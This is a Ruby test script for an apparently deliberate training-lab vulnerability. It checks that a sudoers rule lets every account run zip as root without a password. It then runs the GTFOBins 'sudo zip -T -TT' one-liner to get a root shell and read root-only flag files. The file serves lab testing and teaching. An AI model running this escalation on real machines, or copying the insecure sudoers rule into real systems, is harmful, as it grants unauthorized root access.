require_relative '../../../../../lib/post_provision_test'


class SudoRootZipTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_zip'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('zip installed', 'readlink -f /usr/bin/zip', '/usr/bin/zip')
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_zip", 'root:root 440')
      test_local_command('sudoers rule allows zip as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_zip', 'ALL  ALL=(root) NOPASSWD: /bin/zip *, /usr/bin/zip *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list_zip', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers syntax valid', 'visudo -c 2>&1', 'parsed OK')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees: sudo -n -l lists zip for any account
      test_local_command('unprivileged user can list the zip sudo rule', 'sudo -n -l', '/usr/bin/zip *', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    # Tier 3: local privilege escalation, no Metasploit module. A throwaway account
    # runs the GTFOBins zip "sudo" technique: zip -T -TT <cmd> runs <cmd> as the
    # "unzip test" program, so under sudo it runs as root. The command prints id and
    # reads the root-only flag(s). <privilege>=root_rwx, so the shell must be uid 0.
    tier(3) do
      if leaked.empty?
        skip_check('zip sudo privesc', 'no leaked_filenames to read as root', tier: 3)
      else
        flag_paths = leaked.map { |f| Shellwords.escape("/root/#{f}") }.join(' ')
        with_throwaway_ssh_user do |user, _pass|
          # the trailing ' #' makes zip's appended archive name a comment
          exploit = %Q{TF=$(mktemp -u); sudo -n /usr/bin/zip $TF /etc/hosts -T -TT 'id; cat #{flag_paths} #'; rm -f $TF}
          out = run_as_user(user, exploit)
          body = "#{out[:stdout]}\n#{out[:stderr]}"
          add_evidence('sudo_root_zip_privesc', "echo #{Shellwords.escape(body)}")

          if body =~ /uid=0\(root\)/
            pass_check("#{user} escalates to root via sudo zip (GTFOBins)",
                       "privesc ran as root: #{body[/uid=\S+/]}; <privilege>=root_rwx verified", tier: 3)
          else
            fail_check("#{user} escalates to root via sudo zip (GTFOBins)",
                       "expected uid=0; got #{body[/uid=\S+/] || body[0, 200].inspect}", tier: 3)
          end

          present = strings.reject { |s| s.strip.empty? }
          if present.empty?
            skip_check('root-only flag content read after escalation', 'no strings_to_leak supplied', tier: 3)
          else
            missing = present.reject { |s| body.include?(s) }
            if missing.empty?
              pass_check('root-only flag content read after escalation',
                         'every leaked string recovered via the zip escalation', tier: 3)
            else
              fail_check('root-only flag content read after escalation',
                         "leaked string(s) #{missing.map(&:inspect).join(', ')} not recovered", tier: 3)
            end
          end
        end
      end
    end
  end

end

SudoRootZipTest.new.run
